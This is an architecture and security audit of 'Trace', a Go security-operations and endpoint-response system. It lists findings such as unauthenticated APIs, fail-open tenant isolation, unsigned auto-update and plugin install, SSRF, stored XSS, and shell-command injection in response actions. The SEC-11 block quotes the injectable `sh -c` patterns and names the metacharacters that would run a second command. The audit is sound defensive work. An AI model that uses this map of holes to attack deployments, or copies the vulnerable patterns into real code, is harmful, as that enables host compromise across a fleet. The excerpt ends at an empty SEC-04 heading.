# Trace — Full-System Architecture, Security & Engineering Audit

> Date: 2026-09-20
> Scope: entire repository. Code root `dev/` (Go module `github.com/yanmyoaung2004/trace`). Project root `D:/Projects_And_Learning/AI/Trace`.
> Method: read-only, repository-wide. 7 parallel audit slices (arch-map, security, hardcode/config, AI/agent, data/perf/reliability/concurrency, testing/observability/quality/API, deploy/supply/extensibility/product). Critical claims re-verified by direct read: `dev/internal/server/sync.go:143-157`, `dev/internal/server/dashboard.go:39-47`, `dev/internal/edr_agent/response/executor.go:209-273`, `dev/internal/response/response.go:80-137`, `dev/internal/storage/sqlite/hot_store.go:49-55`.
> No code modified. No benchmark numbers invented — impact is qualitative (Low/Medium/High/Critical).

---

# Executive Summary

**What it is.** Trace is a single-binary Go SOC monolith: `dev/cmd/trace` (CLI + daemon + central server + TSE ops) plus `dev/cmd/trace-agent` (endpoint agent). CLI-first with BubbleTea TUI and an HTTP dashboard. Ingest via a native SIEM engine (file watcher + syslog, 9 decoders, ~462-rule engine with YAML support) plus EDR agents (process/file/network/memory/YARA/FIM, ETW/netlink/inotify/RDCW + polling fallbacks) plus edge sync. Detection via SIEM RuleEngine + Sift (YARA/PE/VT/rootkit) + Archive (MITRE/CVE/IOC + web search) + threat-intel integrations (VirusTotal, OTX, AbuseIPDB, Splunk, Elastic). Decision via Dispatch (heuristic + LLM planner with provider chaining) + YAML playbook Executor (`if`/`wait`/`timeout`, `${input}`/`${outputs}` interpolation) + hunt scheduler + SQLite task queue. Response via two stacks: local privileged shell (`dev/internal/response`) and fleet actions (`dev/internal/edr_agent/response` via server-queued `PendingAction`). Storage via optional Trace Storage Engine (SQLite hourly hot tables → watermark-driven flusher → ZSTD Parquet + manifest catalog → Router/DuckDB → compactor/GC/TTL/scrub/snapshot) plus legacy SQLite operational DB (`trace.db`), JSONL investigation logs, and server-side multi-node tables.

**What it does well.**

- Boring, deployable single binary; Go 1.26, pure-Go default, optional DuckDB via build tag; static multi-arch builds.
- TSE v5 design is fundamentally sound: SQLite as WAL → watermark flusher → Parquet canonical store → manifest as single source of truth → UUIDv7 dedup/cursor. LSM semantics rented from boring components.
- Offline-first: embedded MITRE/CVE/IOC/YARA/playbooks; air-gap capable.
- Test breadth: 56/56 packages with tests, zero data races per assessments, fuzz targets (SIEM decoders, merge-sort dedup, query builders), crash/load/soak harnesses, golden CLI files.
- Operational surface exists: Prometheus-style `/metrics`, `/healthz`/`/readyz`, TSE status/flush/inspect/snapshot CLI, S3/MinIO cold tier, sharded TSE, Postgres backend for stateless server, RBAC-shaped tables with `org_id`.

**Major weaknesses.**

1. **Authorization is decorative.** Dashboard + live/TSE data APIs unauthenticated; EDR enroll/download/feed unauthenticated; agent handlers trust client-supplied `agent_id`; scope stored but never enforced; revoke needs only read; tenant isolation fail-open (`OR org_id=''` + self-asserted org + missing org predicates).
2. **Response path is RCE.** Attacker-controlled `ip`/`path`/`script` interpolated via `Sprintf` into `sh -c`/`powershell` in both local and endpoint executors; `run_script` executes arbitrary shell; action `chain` amplifies one dispatch into many; destructive playbooks ship without `wait: analyst_approval`; approval is a global status flag with no nonce/identity/expiry.
3. **Supply chain unsigned end-to-end.** `.so` plugin install over HTTPS with no hash/signature; `curl|bash` / `Invoke-WebRequest` installers hitting unauthenticated download; auto-update with channel-delivered SHA (empty skips), weak prefix containment, lexicographic version compare; `latest` pins; broad CI token; `Vet||true`.
4. **Audit trail dead.** Logger constructed, zero `Write` callsites; HMAC excludes `Details`; signing key ephemeral per process; no `/api/v1/audit` reads despite permission bit.
5. **Durability contradicts claims.** Hot store `synchronous=OFF` (docs say WAL+NORMAL); checkpointer never wired; cross-hour batches mis-partitioned on `events[0]`; 62-row recursive chunks (~1.6k txns per 100k); TTL over-fires (`MinTS<=cutoff` marks all expired); compactor non-transactional; retention/drop unwired; `CleanupSuperseded` never scheduled.
6. **Exactly-once does not hold.** Flusher random FileID per retry + per-group watermark → dup files + gaps; agent retry queue never drains (`PopBatch` unused, deletes bad rows, mints IDs); tasks/hunts lack leases/CAS; dedup table-name bug + 50-row persist cap; correlator default rules never fire (empty `EventTypes` + `matchesType` false-on-empty).
7. **Config split across 4 systems.** Central `config.go` bypassed by agent file+remote-merge, cobra flags writing live structs, ad-hoc `os.Getenv`, plus two incompatible `SIEMConfig` types (central `cfg.SIEM` dead; serve uses siem type). No precedence doc, no `Validate()`, no reload. Secrets 0644, keys printed, `tracetrace`/`CHANGE_ME` committed.
8. **Performance cliffs.** Router/shard materialize 100k+100k then limit + sort/dedup ×2–3 (N-shard N×100k RAM); hot `UNION ALL` all tables + cross-table `ORDER BY id LIMIT`; cold reader materializes whole row groups; SIEM `regexp.Compile` per event + single goroutine; agent `COUNT+SUM` per Push; S3/backup whole-object buffering; queue spill one-file-per-event storing only ID.

**Architectural maturity.** Late-prototype / single-team beta. Good bones for a single-node small SOC with trusted operators and trusted network. **Unfit** for multi-tenant, hostile-network, or fleet-hostile deployment without P0 fixes. Do not scale horizontally until identity, tenancy, durability, lifecycle, and leader fencing are fixed. Modular monolith remains correct — microservices would worsen the trust and lifecycle problems.

**Biggest risks (in order).** (1) Fleet/host RCE via response shells + `run_script` + privileged agent. (2) Tenant and investigation disclosure via open dashboard + fail-open org + self-asserted enrollment. (3) Silent evidence loss (drops, `OFF`, TTL/compactor/retention gaps, never-draining queues). (4) Split-brain dual flushers (S3 heartbeat, no fencing/term). (5) Unsigned auto-update → root/SYSTEM RCE via MITM or server compromise.

---

# System Architecture

## Reconstructed runtime

```text
Endpoint (trace-agent: process/file/net/mem/YARA/FIM/ETW/netlink/inotify/RDCW/polling)
  → Deduplicator → Correlator → SQLite queue → Transport (HTTPS, HMAC-decorative, backoff, breaker)
  → server /api/v1/edr/* → edr_events (+ async TSE fan-out via context.Background(), unbounded)

SIEM (file poll every 5s + syslog UDP/TCP) → 9 decoders → eventCh(10k) → RuleEngine (regex/correlation)
  → alertCh(1k) → dedup 5m / alertmgr(threshold/suppress) → serve OnAlert
  → TSE write + auto-case(sev>=4) + goroutine playbook+report + notifier fan-out

TSE: IngestQueue(ch65536 → spill → drop) → Batch(1000 | 250ms) → SQLite HOT hourly (single idx ts_us)
  → Flusher(id > watermark, 100k reads) → group(tenant,hour) → Parquet(sort agent,ts; temp→fsync→rename→SHA)
  → manifest commit (file + watermark in one txn) → Router(watermark ±10m overlap:
      hot UNION ALL + cold FilesFor → merge/sort/dedup by UUIDv7)
  → Compactor(48h hourly→daily) → GC/TTL(365d → expired → 7d grace → delete) → scrub/snapshot/backup
  → optional Shard(FNV mod N, per-shard watermark) | S3(BasicAuth HTTP, no SigV4) | Leader(S3 heartbeat, no fencing)

Decision: investigate → extractParams → dispatch heuristic → LLMPlanner (fallback hash-lookup)
  → Executor(interpolate silent-empty, if ==/!= only, wait approval-poll 500ms forever, timeout)
  → plugin.Registry.Get(agent).Execute(params) — no caller identity / permission / policy
  → synthesize_report (prior outputs concatenated unsanitized)

Response: local response.Agent (sh -c / powershell)  OR  fleet PendingAction → agent poll → executeSingle (+chain reuses Params)
State: SQLite ops (trace.db) + TSE tiers (hot.db + manifest.db + events/) + server_* tables + JSONL <id>.jsonl (0644) + agent_defaults.json
Presentation: cobra CLI + BubbleTea TUI (5 screens) + server dashboard (unauth) + exporter (:8080, no auth) + /metrics (unauth)
Cross-cutting: HMAC audit chain (dead), RBAC map + org_id (fail-open), telemetry POST every 24h, 6-channel notifier
```

## Data/control flows

- **Investigate (one-shot):** `cmd/trace/investigate.go` regex-extracts params → `dispatch/host.go` heuristic picks playbook → LLM fallback (`Get(llmName)` existence-only, params verbatim) → `playbook/executor.go` sequential steps with interpolation → `plugin.Registry` dispatches to compiled-in agents (sift/archive/response/notifier/sca/edr/abuseipdb/otx/splunk/elastic/dispatch) or `.so`/sidecar → `synthesize_report` merges outputs → JSONL log + DB rows.
- **Serve (daemon):** `cmd/trace/serve.go` builds TSE stack (`tse_init.go`), starts SIEM engine, task worker (2s poll `Claim`), hunt scheduler (60s sequential, 10m ctx), edge sync (30s push 50, no delta), report exporter. `OnAlert` fans out with unbounded `go` per alert.
- **Server (central):** `cmd/trace/server_cmd.go` + `internal/server/*` serves dashboard + `/api/v1/*` sync + EDR fleet API + compliance snapshot + admin users/orgs. Same mux serves unauth dashboard and authenticated API on one port. TLS optional; plaintext default.
- **Agent (endpoint):** `edr_agent/agent.go` god-Agent runs monitor loops (batcher, flush, analysis, poller), SQLite spill queue, unconditional `pollAndExecute` (including `isolate_host` → `iptables -P DROP`), auto-update with SHA-optional verify.
- **Storage lifecycle (intended vs actual):** intended `Collection → Normalization → Enrichment → Processing → Detection → Storage → Alerting → Response → Retention/Deletion`. Actual gaps: `Annotations` dropped (no hot column/parquet field, dropped in `eventToParquet` and server TSE mapping); enrichment outputs untrusted and interpolated; detection single-goroutine; hot-drop unwired (flusher never drops, `HotWindow` unwired); TTL over-fires; compactor non-atomic; superseded cleanup unscheduled; manifest rows forever; tasks linger `done/failed` forever.

---

# Repository Map

| Component | Responsibility | Dependencies | Risk | Notes |
| --------- | -------------- | ------------ | ---- | ----- |
| `dev/cmd/trace/root.go` — App | Cobra wiring, Registry + managers, audit init | config, db, playbook, plugin, investigation, hunt, cases, audit, tui | High | God-object `var app`; ~13 concretes, no interfaces; `audit.New` never written |
| `dev/cmd/trace/serve.go` — daemon | TSE+SIEM+worker+edge-sync; `OnAlert` fan-out | siem, storage, notifier, edge | High | Unbounded goroutines; `TenantID=default`; auto-case per alert + `<nil>` IOC junk |
| `dev/cmd/trace/tse_init.go` | TSE stack build/start/stop, disk checks | sqlite, manifest, parquet, cold, router, flusher, gc, queue, shard | High | Double stack if sharded; global `StoragePathFunc`; leader check once; disk-full log-only |
| `dev/cmd/trace/server_cmd.go` | Central server mode + TSE hot adapter | server, storage | Medium | Same binary, separate config flag; dashboard + API share mux |
| `dev/cmd/trace/investigate.go` | One-shot investigate flow, param extraction | dispatch, playbook | High | Inputs flow to webhook/LLM/shell sinks; no approval gate |
| `dev/cmd/trace/{tse_cmd,edr_cmd,admin,case,approval,plugin_cmd,update,genkey}.go` | TSE/EDR/admin/case/approval/plugin/update/key CLIs | server, storage, edge | High | `admin.go:32` Sprintf JSON; `edr_cmd.go:179` raw query concat; `plugin install` no sig; `genkey` key perms; update 17 hardcoded names |
| `dev/cmd/trace-agent/main.go` | Endpoint entry (install/service/SIGHUP) | edr_agent | Medium | Service install paths; privileged by design |
| `dev/internal/config/config.go` | Central `~/.trace/config.json` + 7 env | stdlib | High | Save 0644 leaks LLM/VT/SMTP/S3 keys; `SIEMConfig` dead duplicate; no Validate/reload |
| `dev/internal/db/db.go` | SQLite/Postgres shim + ops schema | sqlite, pgx | High | `translate()` string surgery corrupts literals; no FK/down; local tables lack `org_id`; error-ignored ALTERs in `pb.go:184-195` |
| `dev/internal/agent/agent.go` | `Agent` contract `Name/Capabilities/Execute` | — | High | No principal/scopes/attestation — AuthN/AuthZ unenforceable by design |
| `dev/internal/plugin/plugin.go` + `sidecar.go` | Registry last-wins + `.so` loader + sidecar spawn | `plugin` pkg | Critical | `agents[Name()]=a`; `plugin.Open(*.so)` + `Lookup(Plugin)` no hash/sig/allowlist; sidecar `exec.Command(path)` + self-declared caps, stderr Discard |
| `dev/internal/dispatch/host.go` (~1072L) | Heuristic + LLM planner + synthesis | playbook | High | God file; raw intent into prompt; unverified LLM JSON → tool params; cache mem+SQLite 24h; score ladder hardcoded |
| `dev/internal/playbook/playbook.go` + `executor.go` + `interpolate.go` | YAML load + step executor + Scope interp | plugin, investigation | High | Missing → `""`; `if` only `==/!=`; approval polls 500ms forever; `PendingApprovals` + `investigation refs` stubs |
| `dev/internal/investigation/investigation.go` | CRUD + JSONL LogWriter + timeline | db | Medium | `ListPendingApprovals` 6-col select vs 7-col scan; open/close per event; 0755/0644; `TrimPrefix` traversal sink |
| `dev/internal/taskqueue/taskqueue.go` | DB poll queue Claim/Complete/Fail | db | High | Read-then-write DEFERRED tx, unconditional UPDATE → double-claim; no lease/retry/DLQ; 2s poll floor |
| `dev/internal/siem/siem.go` | Engine: decoders → eventCh10k → RuleEngine → alertCh1k → dedup | stdlib | High | Drop+log on full; `filePositions` never evicts; `ReadDir` every 5s; 64KB line cap drops; unbounded TCP goroutines |
| `dev/internal/siem/decoder.go` | 9 decoders (JSON/Apache/syslog/Win/EVTX/K8s/Suricata/CSV/raw) | — | Medium | Order-sensitive; fallback raw hides miswire; severity maps scattered |
| `dev/internal/siem/rules.go` (~941L) | Regex/YAML compiler + correlation maps + compliance map | yaml | High | God file; `regexp.Compile` per event; rule-slice copy per event; maps without TTL; global suppress; correlationKey 2 IDs else global bucket |
| `dev/internal/siem/alertmgr/manager.go` | Threshold/suppression fatigue filter | — | Medium | Keyed RuleID only → cross-host bleed |
| `dev/internal/sift/` (detection, pe, hash, vt, rootkit) | YARA/PE/hash-cache/VT/rootkit agent | sqlDB | Medium | Caps omit rootkit actions; IP heuristic misclassifies; error-as-data; `hash.go` duplicates `archive/intel.go` |
| `dev/internal/archive/` (knowledge, intel, cve) | Builtin IOC map + TTL + MITRE/CVE/web_search | sqlDB, Firecrawl | Medium | Global mutable map; substring FP; 1.5MB seed bloats binary; NVD/Firecrawl bespoke clients |
| `dev/internal/response/response.go` | Local block/quarantine/kill/restart + rollback | sqlDB | Critical | `Sprintf(ip/path)→sh -c/powershell`; `recordAction` no owner; rollback executes stored command |
| `dev/internal/server/permissions.go` | Roles/scopes/ctx keys | — | High | `ScopeFull/ReadOnly` defined, never enforced; `PermAgentRevoke` never referenced |
| `dev/internal/server/pb.go` | Migrate + auth + org backfill + correlations | db | High | Triple near-identical `Authenticate*`; user keys plaintext; `SeedDefaultUser` empty password_hash; `OR org_id=''` pattern; `LIMIT %d` Sprintf |
| `dev/internal/server/sync.go` (~1305L) | HTTP sync + EDR fleet + compliance + admin | db, storage | Critical | Open enroll/download/feed; ctx identity ignored; coarse perms; unbounded `body.Events`; `AlertID[:8]` panic on short ID |
| `dev/internal/server/dashboard.go` (~859L) | HTML + `/api/live|tse|charts` | db | Critical | Zero auth wrapper; CSS/Chart.js CDN inline; badge-class injection; raw ID in script; `innerHTML` from event JSON; quote-only `jsStr` |
| `dev/internal/server/server.go` | Daemon entry + stale-node sweeper + seed print | — | High | Prints API key to stdout; 90s stale threshold magic |
| `dev/internal/server/agent_config.go` | `agent_defaults.json` remote store | — | Medium | Write 0644 (dir 0700); any-agent `PUT` sets fleet-wide monitors |
| `dev/internal/edge/client.go` | Register → 30s push 50 inv | investigation | Medium | Full resend duplicates; hand-rolled indicator parse; `Close` no-op; decode errors ignored |
| `dev/internal/edr_agent/agent.go` (~1020L) | 15+ monitors + transport + exec loops | monitor, transport, queue | Critical | God struct; fanotify→inotify→poll chain; auto-generate APIKey trusts client; stats unsynchronized |
| `dev/internal/edr_agent/monitor/` | proc/file/net/FIM/ETW/YARA/corr/dedup/tree/entropy/flood/vuln/pe/killchain | exec, powershell | High | Shell-out per interval; hardcoded suspicious lists; default correlator rules never fire; dedup wrong table name; 50-row persist cap |
| `dev/internal/edr_agent/queue/queue.go` | Endpoint SQLite spill, evict-oldest-100 | sqlite | High | Silent loss; `COUNT(*)+SUM(LENGTH)` per Push under mutex; `PopBatch` never consumed |
| `dev/internal/edr_agent/response/executor.go` | `PendingAction` + chain executor | monitor | Critical | Same `sh -c` pattern; arbitrary `run_script`; chain reuses Params; snapshotBefore block_ip-only; 30s no kill-tree |
| `dev/internal/edr_agent/transport/client.go` | HMAC/retry/breaker/mTLS-opportunistic | — | Medium | `X-Signature` never verified server-side; `Sleep` ignores ctx; double 429 sleep; `defer Close` in loop |
| `dev/internal/edr_agent/updater/updater.go` | Download/verify/swap | — | Critical | Empty SHA skips verify; any `download_url`; 0755 swap no fsync; no signature |
| `dev/internal/edr_agent/config.go` | Agent defaults + file + partial remote merge | — | Medium | `https://127.0.0.1:8080` vs `localhost:8080` sprawl; subset-only merge |
| `dev/internal/storage/types.go` + `interfaces.go` | Event/Query/Result + Writer/Reader/Flusher/GC | — | Medium | `Annotations` dropped downstream; `DefaultMaxLimit` 100k no byte cap |
| `dev/internal/storage/queue/queue.go` | Bounded ch65536 + lossy per-event spill | — | High | One file per event storing only ID; `Replay` test-only; `OnDrop` unwired in serve |
| `dev/internal/storage/batch/` | Accumulator 1000\|250ms + writer goroutine | — | High | Two batch layers overlap; failure re-prepends whole batch (poison HOL); `Close` vs `Submit` panic |
| `dev/internal/storage/sqlite/hot_store.go` | Hourly tables, `idx ts_us`, `OFF` | sqlite | High | `synchronous=OFF`; `events[0]` mis-partition; 62-row chunks; `UNION ALL` all tables; checkpointer never wired |
| `dev/internal/storage/manifest/manifest.go` | files/watermark/hot_tables, `FilesFor`, OrphanGC | sqlite | Medium | `FULL` correct; bare `CREATE IF NOT EXISTS` no version log; OrphanGC startup-only |
| `dev/internal/storage/parquet/` | Writer temp→fsync→rename→commit; schema; compression | parquet-go | Medium | Single-row writes + re-sort + 2 re-reads; compression level not passed; schema version hardcoded 1; deprecated shim |
| `dev/internal/storage/flusher/` | Watermark `id>lastID` 100k → group(tenant,hour) | sqlite, manifest | High | Random FileID per retry; per-group watermark gaps; `f.mu` serializes all; readiness 256MB-or-hour+5m rarely ready |
| `dev/internal/storage/router/router.go` + `pagination.go` | Hot/cold fan-out ±10m, merge/dedup; cursor helper | sqlite, cold | High | `hadError` race; limit-after-materialize; open query double-scans; cold fail → warning; pagination helper unused by HTTP |
| `dev/internal/storage/cold/` | Pure-Go + DuckDB readers, pool, S3 temp | parquet-go, duckdb | High | Whole row-group materialize; temp `hex(len)` collides; opens `s3://` not temp; 0644; pool bypassed by shard |
| `dev/internal/storage/compactor/` + `gc/` + `snapshot/` + `backup/` + `metrics/` | 48h merge; TTL/grace/scrub; tar backups; counters | — | High | Compactor non-Tx; TTL over-fires; `CleanupSuperseded` unscheduled; torn snapshots (no checkpoint/WAL); RAM-buffered backup + lexical rotation; most counters never incr |
| `dev/internal/storage/{s3,leader,shard}.go` | S3 uploader; S3-heartbeat elector; FNV sharding | — | High | BasicAuth HTTP, no SigV4; unconditional promote, never written back; per-shard watermark; `fnv mod N` remaps on N change |
| `dev/internal/integration/{abuseipdb,otx,edr,splunk,elastic,notifier}/` | TI + EDR + SIEM-connector + 6-channel notify | http | Medium | Per-method vendor switches; `InsecureSkipVerify` (splunk/elastic); webhook SSRF; creds per-call; only EDR has breaker |
| `dev/internal/plugins/sca/` + `exporter/` | CIS runner; ephemeral `:8080` report server | agent | High | `ListenAndServe` err ignored; port collision with dashboard; no auth |
| `dev/internal/cases/manager.go` | Cases CRUD + PDF/HTML export | db | High | `rows.Scan` err → `continue` (silent drop); free-form status; `LIMIT 100`; no `org_id`; `ExportHTML` omits evidence |
| `dev/internal/hunt/manager.go` + `scheduler.go` | Hunt CRUD + 60s sequential scheduler | db, playbook | High | List→Get N+1; `runHunt` 10m blocks others; durations only (no cron); no claim → duplicate runs |
| `dev/internal/audit/logger.go` | HMAC chain + Verify | sqlDB | High | Ephemeral key; `sigInput` omits `Details`; full-scan Verify; zero writes |
| `dev/internal/compliance/` | Frameworks + ReportEngine + history | — | Medium | Silent-error history/assessments; corrupt line skipped; static MITRE→compliance labels; single-case renderers only |
| `dev/internal/tui/tui.go` | BubbleTea 5-tab UI | bubbletea | Medium | App→TUI DTO adapters duplicate logic |
| `dev/internal/telemetry/telemetry.go` | Daily POST version/OS/counts | — | Medium | No status check; opt-in unclear; dead `init` |
| `dev/internal/crypto/gencert.go` | Self-signed cert gen | — | Low | P-256 + ServerAuth correct; 365d/2048-bit should be config; key file perms weak |
| `dev/internal/locale/` | EN + MY strings | — | Low | Only 2 locales; not wired into all output |
| `dev/playbooks/` (26 YAML) + `dev/internal/playbook/*.yaml` | Declarative chains | sift, response, notifier | Medium | Dual source; no schema/version; destructives lack `wait:` |
| `dev/deploy/` + `Dockerfile` + `docker-compose.yml` + `.github/` | Images/compose/k8s/installers/CI/release | — | High | Privileged agent; `latest`; `CHANGE_ME`; curl\|bash unauth; broad CI perms; `Vet\|\|true`; release drops LDFLAGS |
| `dev/tools/wazuh-converter/main.go` | Wazuh XML → Go codegen | — | Medium | Absolute `C:/Users/YMA` + `D:/` paths; checked-in generated file; unreproducible |
| `dev/landing/` | Static marketing site | — | Low | Out of audit scope except asset hygiene |

Dead / duplicate / stub inventory: `PendingApprovals` + `investigation refs` permanent-error stubs; `ToParquetCompression` shim; `siem/integration_test.go:297-298` scaffold; ~19 dead `init`/`var _` pacifiers; dual playbook sources; dual response stacks; dual `SIEMConfig`; `ReaderPool` bypassed; `Replay` test-only; `ScopeFromContext` tested but dead.
# Security Findings

Severity scale: Critical = immediate RCE / data-loss / tenant-leak / catastrophic integrity failure. High = major authZ / reliability / scalability break. Medium = meaningful debt. Low = limited-impact hardening.

| ID | Severity | Component | Finding | Evidence | Impact | Recommendation |
| -- | -------- | --------- | ------- | -------- | ------ | -------------- |
| SEC-01 | High | `dev/internal/server/dashboard.go:39-47`, `dev/internal/server/sync.go:887-940` | Unauthenticated dashboard + data APIs (`/`, `/investigations/`, `/correlations`, `/cases`, `/alerts`, `/api/live`, `/api/tse`, `/api/dashboard/charts`) | `RegisterRoutes` registers all handlers with zero `protected`/`requirePermission` wrapper (verified by direct read); `ServeHTTP` mounts dashboard openly alongside API | Investigations, IOCs, nodes, TSE stats world-readable to anyone with network access | Gate every route behind auth; bind `/metrics` to localhost or require perm; add 401 tests; add CSP |
| SEC-02 | High | `dev/internal/server/sync.go:143,344-400` | Open EDR auto-enrollment mints valid agent key | Route `/api/v1/edr/register` has neither `protected()` nor `agentProtected()` (verified); handler `INSERT INTO edr_agents ... 'active'` with attacker hostname/platform/org and returns key | Rogue agents, inventory poisoning, tenant spoof | Enrollment token or admin approval queue; server-assigned org; rate-limit; test unauth=401 |
| SEC-03 | High | `dev/internal/server/sync.go:154,1225-1255` | Unauthenticated agent-binary download | `handleEDRUpdateDownload` lacks `agentProtected` while check requires it; `ServeFile(binPath)` under update dir | Binary disclosure, version recon; feeds SEC-10 RCE chain | Require agent auth; signed URLs; separator-safe containment + symlink deny |
| SEC-04 | High | `dev/internal/server/sync.go:413,452,551,650` | Agent identity confusion / cross-agent IDOR | `ctxKeyAgentID` established but heartbeat/events/pending/result trust body/query `agent_id`; `UPDATE edr_actions ... WHERE id=?` with no ownership predicate | Cross-agent forgery, action theft, result poisoning | Bind all mutations to ctx ID; add `AND agent_id=?`; test agent-A vs agent-B = 403 |
| SEC-05 | Medium | `dev/internal/server/sync.go:72-75`, `dev/internal/server/permissions.go:79` | Dead read-only scope control | `scope` stored in ctx; zero enforcement sites; only reader is helper + unit test | Read-only key has full role permissions | Enforce method x scope matrix; log scope on deny; or delete scope |
| SEC-06 | High | `dev/internal/server/sync.go:151,727` | Revoke guarded by read permission | Route requires `PermAgentRead`; `PermAgentRevoke` never referenced; DELETE sets `status='revoked'` | Viewer/analyst revokes arbitrary agents | Require `PermAgentRevoke` + audit write; test viewer DELETE = 403 |
| SEC-07 | Medium | `dev/internal/server/sync.go:157,1051` | Compliance snapshot ingest lacks permission check | Bare `protected()`; hostname/framework/score from body unvalidated | Forged compliance scores, false assurance | Require compliance perm; framework allowlist; score-range validation |
| SEC-08 | High | `dev/internal/server/sync.go:360,477,687`, `dev/internal/server/pb.go:330` | Broken multi-tenant isolation | Self-asserted `org_id` at open enroll; events/investigations/correlations lack org predicate; agents list `AND (org_id = ? OR org_id = '')` | Cross-tenant reads; legacy rows leak to every tenant | Server-assigned tenant; predicate everywhere; backfill + index; per-tenant tests |
| SEC-09 | Medium | `dev/internal/server/sync.go:318`, `dev/internal/investigation/investigation.go:148` | Timeline log path traversal | `TrimPrefix(/api/v1/timeline/)` flows to `Join(dir, id+.jsonl)` with no `Clean`/`..` check | Authenticated read of `.jsonl`-suffixed files outside logDir | `Base` + allowlist `^[A-Za-z0-9-]+$`; reject `..`/`/` |
| SEC-10 | Critical | `dev/internal/server/sync.go:1225,1163`, `dev/internal/edr_agent/updater/updater.go:84` | Unsigned auto-update with weak containment | SHA-256 delivered over same channel, empty skips verify; prefix check without separator + `ServeFile` follows symlinks; lexicographic version compare; plaintext HTTP allowed | MITM or server compromise yields root/SYSTEM RCE | Fail-closed checksum + code signature (cosign/sigstore); semver compare; HTTPS-only |
| SEC-11 | Critical | `dev/internal/edr_agent/response/executor.go:209-273,400-407`, `dev/internal/response/response.go:82-137` | RCE via response actions + shell interpolation | `ip`/`path` via `Sprintf` into `sh -c`/`powershell` (verified: `iptables -A INPUT -s %s`, `mv \"%s\"`, `netsh ... remoteip=%s`); `script` verbatim to `sh -c`; dispatch has no allowlist | Any dispatcher credential or server compromise becomes fleet-wide root/SYSTEM RCE | `exec.Command(argv)` + strict validators (netip/CIDR, PID digits, path confinement); remove or gate `run_script`; approval for isolate/block |
| SEC-12 | Medium | `dev/internal/edr_agent/response/executor.go:55`, `dev/internal/server/sync.go:833` | Unrestricted dispatch + client-side action chaining | Opaque `Params` stored as JSON; `chain.([]any)` re-executes same Params per link type | One dispatch fans into many privileged executions | Action-type allowlist + JSON-schema params + size cap; delete client-side chain |
| SEC-13 | Medium | `dev/internal/edr_agent/transport/client.go:160`, `dev/internal/server/sync.go:111` | Dead HMAC request signature | Client sends `X-Signature` HMAC-SHA256; server never reads or recomputes on any route | Tamper/replay protection appears to exist but does not | Verify HMAC with nonce/expiry, or remove header |
| SEC-14 | High | `dev/internal/edr_agent/transport/client.go:100`, `dev/internal/server/sync.go:905,1270` | Missing mTLS enforcement; cleartext allowed | Client certs opportunistic with fallback; server never verifies peers; `ListenAndServe` default; `serverBaseURL` inherits `http` | API/event/binary sniffing and MITM | TLS-by-default; server `VerifyClientCertIfGiven` then require; warn on plaintext |
| SEC-15 | High | `dev/internal/server/pb.go:429,489`, `dev/internal/server/sync.go:65`, `dev/internal/server/server.go:24` | Plaintext API keys, URL transport, stdout leak | User keys stored plaintext (agents hashed); `?api_key=` accepted on all protected routes; fresh admin key `Printf` on boot; no expiry | DB read, log, or shoulder-surf yields long-lived creds | Hash user keys; header-only; write-once file 0600; expiry + rotation + rate-limit |
| SEC-16 | Medium | `dev/internal/config/config.go:130`, `dev/internal/server/agent_config.go:55`, `dev/cmd/trace/genkey.go:80` | World-readable secret/key files | Full Config (LLM/VT/SMTP/S3) 0644; `agent_defaults.json` 0644; TLS key inherits umask | Local user reads all keys | 0600/0700; `*_FILE` variants; `Chmod 0600` on keys; never log secrets |
| SEC-17 | Medium | `dev/internal/audit/logger.go:83`, `dev/cmd/trace/root.go:466` | Audit HMAC gap + ephemeral key + no wiring | `sigInput` excludes `Details`; `audit.New(db, nil)` random key per process; zero `auditLogger.Write` callsites | Security actions unlogged and mutably logged; `Verify` tests never-written log | Include details; persist KMS key 0600; wire writes on auth/dispatch/revoke/case/user; add `/api/v1/audit`; paged Verify |
| SEC-18 | High | `dev/internal/server/dashboard.go:289,453`, `dev/internal/compliance/report.go:527` | Stored XSS across dashboard + reports | Unescaped status in class attribute; raw ID in script fetch URL; `innerHTML` timeline from agent/event JSON; quote-only `jsStr`; raw compliance HTML | Compromised agent or edge input executes in operator browser; unauth dashboard amplifies | `html/template` contextual escaping; `textContent`; strict JS escaper; CSP |
| SEC-19 | High | `dev/internal/integration/notifier/notifier.go:384`, `dev/cmd/trace/investigate.go:44` | SSRF via generic webhook action | Arbitrary url/method/body with no allowlist (slack/discord validate, webhook does not); params derive from operator/user queries via playbook interpolation | Internal probing, cloud-metadata access, exfiltration | URL allowlist + block metadata/link-local + method cap + size/timeout |
| SEC-20 | High | `dev/cmd/trace/plugin_cmd.go:141` | Unsigned plugin download + install | `client.Get(url)` to `.so` with no hash/signature; `Base(url)` overwrite semantics; daemon loads next `serve` | Typo-squat or MITM gives operator-machine RCE | Checksum + signature (cosign); pinned registry; explicit prompt; sandbox sidecar |
| SEC-21 | Medium | `dev/internal/server/pb.go:80,489` | Static-key-only auth, no hardening | `password_hash` always `""`; no bcrypt/argon; single non-expiring bearer; no server-side throttle | Key guess and reuse forever | Expiry + rotation policy; server rate-limit + lockout; consider OIDC |
| SEC-22 | Low | `dev/internal/server/sync.go:200,405` | Verbose errors + log injection | `err.Error()` reflected to callers; attacker hostname/intent via `log.Printf` unescaped | Info disclosure; log forgery | Generic 500 envelope; structured slog with field sanitization |

## SEC finding details (evidence blocks)

### SEC-11 detail — shell sinks (verified)
File: `dev/internal/edr_agent/response/executor.go:218-234,259-273,400-407`. Function: `blockIP`, `runScript`, `runShell`. Observed: `cmdStr = Sprintf(\"iptables -A INPUT -s %s -j DROP\", ip)` then `e.runShell(ctx, cmdStr)` where `runShell = exec.CommandContext(ctx, \"sh\", \"-c\", cmdStr)`; `runScript` passes `Params[\"script\"]` verbatim to `powershell -Command` / `sh -c`. Problem: metacharacters (`;`, `&&`, `$()`, backticks, newlines) in `ip` execute a second command; quotes in `quarantineFile` do not stop `$()`/backticks. Impact: host RCE as agent user (typically root/SYSTEM); fleet-wide via dispatch. Recommendation: `exec.Command(\"iptables\", \"-A\", \"INPUT\", \"-s\", ip, \"-j\", \"DROP\")` after `netip.ParseAddr` + CIDR allowlist; same argv pattern for `mv`/`taskkill`/`pkill`/`systemctl`/`netsh`/`pfctl`; remove `run_script` or gate behind signed policy + per-execution approval.
File: `dev/internal/response/response.go:80-137`. Function: `blockIP`, `quarantineFile`. Observed: identical `Sprintf(ip/path) -> a.runCommand(cmdStr)` pattern. Same fix applies; unify both stacks behind one shared argv contract.

### SEC-04 detail — trust boundary
